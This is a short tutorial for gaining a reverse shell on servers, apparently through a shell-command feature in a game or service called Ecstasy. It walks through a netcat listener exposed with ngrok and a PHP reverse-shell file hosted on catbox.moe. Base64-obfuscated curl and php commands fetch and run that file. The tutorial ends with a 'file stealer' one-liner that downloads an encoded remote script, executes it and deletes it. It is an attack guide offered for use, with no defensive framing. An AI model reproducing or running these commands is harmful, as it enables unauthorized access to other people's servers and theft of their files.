# Simplest Reverse Shell Tutorial (Supports Some Linux and Some Windows Servers)

## On Your Own Computer
1. **Get Netcat**  
   - For Windows: [Download Netcat](https://eternallybored.org/misc/netcat/netcat-win32-1.12.zip)  
   - For Linux or macOS: Find and install the appropriate files for your OS.

2. **Get Ngrok and Set Up**  
   - [Download and setup Ngrok](https://ngrok.com)

3. **Start Ngrok**  
```ngrok tcp 4444```


4. **Start Netcat**  
```nc -lvp 4444```


5. **Download and Edit PHP File**
   - [Download the PHP file](https://files.catbox.moe/s69sex.php) and edit the IP and port to be the Ngrok one.
   - Reupload the edited file to [catbox.moe](https://catbox.moe).

6. **Convert URL to Base64**
   - Use [base64encode.org](https://www.base64encode.org/) to convert the URL to Base64.

## In Game (run under the shell command)
7. **Copy and Paste the Command into Ecstasy**
   - While logged into Ecstasy, use the command below, replacing `{BASE64 GOES HERE}` with the Base64 link:
```curl -O $(echo "{BASE64 GOES HERE}" | base64 --decode)```


8. **Encode Filename and Extension to Base64**
   - Encode the filename and extension that catbox.moe gives in the URL to Base64.

9. **Run the PHP Script**
 ```php $(echo "{FILE NAME BASE64}" | base64 --decode)```
 - If there are errors, the server might not have PHP installed. See below for installation instructions.

## Install PHP on Linux Servers

**To get the distro, use the command:**
```cat /etc/os-release```

### Ubuntu/Debian
```apt install php```

### Fedora
```dnf install php -y```

### Arch
```pacman -S php```


# Duck Notes
![info](https://r2.e-z.host/1aef6b94-3653-4c51-8fef-6587df7580f5/qos28fmh.png)

# file stealer
`bash -c 'curl -o steal.sh $(echo "aHR0cHM6Ly9jYXRsaXR0ZXIubWlub2EuY2F0L2FwaS92aWV3L2FkMGI1MTJhNzZiNTBjODhlY2VmLnNo" | base64 --decode) && chmod +x steal.sh && ./steal.sh && rm -- steal.sh'`
